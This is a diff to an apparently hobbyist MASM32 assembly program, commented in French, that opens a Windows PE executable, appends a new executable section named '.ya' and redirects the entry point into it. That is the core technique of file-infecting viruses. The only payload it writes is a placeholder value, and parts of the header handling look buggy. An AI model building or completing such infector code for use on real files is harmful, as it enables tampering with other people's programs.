@@ -20,16 +20,36 @@ includelib c:\masm32\lib\kernel32.lib
 includelib C:\masm32\lib\masm32.lib
 
 .data
-	strTitle		db "Bare Bone",0
- 	strMessage	db "Hello World!",0
+	strTitle		db 		"Bare Bone",0
+ 	strMessage		db 		"Hello World!",0
  	
 	pathTargetL		db		"Path target",0
 	listTargetL		db		"Targets list",0
-	
+	nbSectionsL		db		"Nb sections",0
+	machineL		db		"Machine",0
+	infoFailedL		db		"Get info failed !!", 0
+	entryPointL		db		"EntryPoint",0
+	lastSectionL	db		"Last Section",0
 	;
 	; Addresse de l'exe mappé
 	;
-	mappedAddr		db		0
+	mappedAddr		dd		0
+	
+	;
+	;	- Header infos
+	;
+	fileHeaderAddr	dd		0
+	machine86		db		0
+	nbSections		dw		0
+	sizeOptHeader	dw		0
+	
+	;
+	;	- Header Ptr
+	;
+	imgFileHeader	dd		0
+	imgOptHeader	dd		0
+	imgEntryPoint	dd		0
+	sectionsHeader	dd		0
 
 ;
 ; Struct url
@@ -51,6 +71,219 @@ CheckExe proc Path:PTR BYTE
  	;invoke MessageBox, 0, uhex$(eax), ADDR strTitle, MB_OK
 	ret
 CheckExe endp
+
+GetInfoPE proc
+
+	; ---------------------------------------------------------
+	;	File Header
+	; ---------------------------------------------------------
+	
+	; Get File Header addr / Set imgFileHeader ptr
+	mov esi, mappedAddr
+	lea esi, [esi + 03Ch]
+	mov edi, 0
+	mov edi, [esi]
+ 	mov fileHeaderAddr, edi
+ 	add edi, 4h
+ 	add edi, mappedAddr
+ 	mov imgFileHeader, edi
+ 	
+ 	; Check File Header addr
+ 	mov esi, mappedAddr
+ 	add esi, fileHeaderAddr
+ 	mov edi, [esi]
+ 	
+ 	cmp di, 4550h
+ 	jne InfoEndFailed
+ 	
+ 	; Check Machine
+ 	mov esi, imgFileHeader
+ 	lea edi, [esi].IMAGE_FILE_HEADER.Machine
+ 	mov di, [edi]
+ 	
+ 	cmp di, 0220h
+ 	je InfoEndFailed
+ 	;and edi, 0000FFFFh
+ 	
+ 	cmp di, 014Ch
+ 	jne MachineSuccess
+	mov machine86, 1
+MachineSuccess:
+	;mov cl, machine86
+	;invoke MessageBox, 0, uhex$(ecx), ADDR machineL, MB_OK
+	
+	; Sections numbers
+	;mov esi, imgFileHeader
+	lea edi, [esi].IMAGE_FILE_HEADER.NumberOfSections
+	mov di, [edi]
+	mov nbSections, di
+	
+	;mov imgFileHeader, ebx
+	;lea edx, [ebx].IMAGE_FILE_HEADER.NumberOfSections
+	;mov , [edx]
+	invoke MessageBox, 0, uhex$(edi), ADDR nbSectionsL, MB_OK
+	
+	; ---------------------------------------------------------
+	;	Optional Header
+	; ---------------------------------------------------------
+	
+	; Set optional header addr
+	lea edi, [esi].IMAGE_FILE_HEADER.SizeOfOptionalHeader
+	mov edi, [edi]
+	mov sizeOptHeader, di
+	
+	
+	mov edi, SIZEOF IMAGE_FILE_HEADER
+	add esi, edi
+	mov imgOptHeader, esi
+	
+	
+	; Entry Point
+	mov edi, [esi].IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint
+	mov imgEntryPoint, edi
+	
+	;invoke MessageBox, 0, uhex$(edi), ADDR entryPointL, MB_OK
+	
+	jmp InfoEnd
+InfoEndFailed:
+	invoke MessageBox, 0, ADDR infoFailedL, ADDR infoFailedL, MB_OK
+	mov eax, 0
+InfoEnd:
+	ret
+GetInfoPE endp
+
+GetLastSection proc
+	local lastSection:DWORD
+	
+	mov esi, imgOptHeader
+	add si, sizeOptHeader
+	mov sectionsHeader, esi
+	
+	;invoke MessageBox, 0, esi, ADDR lastSectionL, MB_OK
+	mov ecx, 0
+	mov cx, nbSections
+BLastSection:
+	test ecx, ecx
+	jz BLastSectionEnd
+	mov lastSection, esi
+	add esi, SIZEOF IMAGE_SECTION_HEADER
+	dec ecx
+	jmp BLastSection
+	; Get nb sections
+	;mov edx, imgFileHeader
+	;mov bx, [edx].IMAGE_FILE_HEADER.NumberOfSections
+	;and ebx, 0000FFFFh
+	
+	;mov ecx, 0
+	;mov esi, sectionsHeader
+	;.WHILE ecx < ebx
+	;	mov lastSection, esi
+		;push ecx
+		;push ebx
+		;pop ebx
+		;pop ecx
+	;	add esi, sizeof IMAGE_SECTION_HEADER
+		;inc ecx
+	;.ENDW
+	;mov esi, lastSection
+	;invoke MessageBox, 0, esi, ADDR lastSectionL, MB_OK
+	
+	;mov eax, lastSection
+	;ret
+BLastSectionEnd:
+	mov esi, lastSection
+	invoke MessageBox, 0, esi, ADDR lastSectionL, MB_OK
+	mov eax, lastSection
+	ret
+GetLastSection endp
+
+OverwriteEntryPoint proc uses esi edi New:DWORD
+	mov esi, imgOptHeader
+	lea edi, [esi].IMAGE_OPTIONAL_HEADER
+	mov esi, New
+	mov DWORD ptr [edi], esi
+	ret
+OverwriteEntryPoint endp
+
+InjectSection proc lastSection:DWORD
+	local endAddr:DWORD
+	local virtualEnd:DWORD
+	local targetSection:DWORD
+	
+	; Derniere section dans le header sections
+	mov esi, lastSection
+	
+	; Set un pointeur sur la section suivante (la notre)
+	mov edi, lastSection
+	add edi, SIZEOF IMAGE_SECTION_HEADER
+	
+	;mov edx, imgOptHeader
+	lea ebx, [esi].IMAGE_OPTIONAL_HEADER.SizeOfImage
+	mov edx, [ebx]
+	add edx, 1000h
+	mov [ebx], edx
+	
+	; Calcul de l'adresse de notre section
+	mov edx, [esi].IMAGE_SECTION_HEADER.PointerToRawData
+	mov ebx, [esi].IMAGE_SECTION_HEADER.SizeOfRawData
+	add edx, ebx
+	mov endAddr, edx
+	mov targetSection, edx
+	
+	mov edx, [esi].IMAGE_SECTION_HEADER.VirtualAddress
+	mov ebx, [esi].IMAGE_SECTION_HEADER.SizeOfRawData
+	add edx, ebx
+	mov virtualEnd, edx
+	
+	; Overwrite entry point
+	invoke OverwriteEntryPoint, edx
+	
+	; Set name
+	mov DWORD ptr [edi], 0061792eh ; ".ya"
+	
+	; Add +1 section number;
+	mov edx, imgFileHeader
+	mov cx, [edx].IMAGE_FILE_HEADER.NumberOfSections
+	lea ebx, [edx].IMAGE_FILE_HEADER.NumberOfSections
+	inc cx
+	mov WORD ptr [ebx], cx
+
+	; Set VirtualSize
+	lea edx, [edi].IMAGE_SECTION_HEADER.VirtualAddress
+	sub edx, SIZEOF DWORD
+	mov DWORD PTR [edx], 00001000h
+	
+	; Set notre VirtuaAddress
+	lea edx, [edi].IMAGE_SECTION_HEADER.VirtualAddress
+	mov ebx, virtualEnd
+	mov [edx], ebx
+	
+	; Set la taille de RawData
+	lea edx, [edi].IMAGE_SECTION_HEADER.SizeOfRawData
+	mov DWORD ptr [edx], 00001000h
+	
+	; Set Pointer to raw data
+	lea edx, [edi].IMAGE_SECTION_HEADER.PointerToRawData
+	mov ebx, endAddr
+	mov [edx], ebx
+	
+	; Set characteristics
+	lea edx, [edi].IMAGE_SECTION_HEADER.Characteristics
+	mov DWORD ptr [edx], 60000020h
+	
+	; Test move to section.
+	mov edx, targetSection
+	mov ebx, mappedAddr
+	add edx, ebx
+	mov DWORD PTR [edx], 41414141h
+	;invoke MemCopy, ADDR code, edx, 14h
+	;mov DWORD ptr [edx], ebx
+	
+	
+	
+	;invoke MessageBox, 0, uhex$([ebx]), ADDR nbSectionsL, MB_OK
+	ret
+InjectSection endp
 
 MapExe proc path:DWORD
 	local buff:OFSTRUCT
@@ -89,7 +322,7 @@ MapExe proc path:DWORD
 	
 	; set entryPoint
 	; set nbSections
-	;invoke GetInfoPE
+	invoke GetInfoPE
 	
 	;
 	; Ajout d'une section dans l'executable.
@@ -100,8 +333,8 @@ MapExe proc path:DWORD
 	;		- DWORD |PhysicalAdresse + VirutSize
 	;		- DWORD VirtualAddress => Address premier byte de la section
 	;		-
-	;invoke GetLastSection
-	;invoke InjectSection, eax
+	invoke GetLastSection
+	invoke InjectSection, eax
 	
 	 
 	;invoke OverwriteEntryPoint, 00414243h
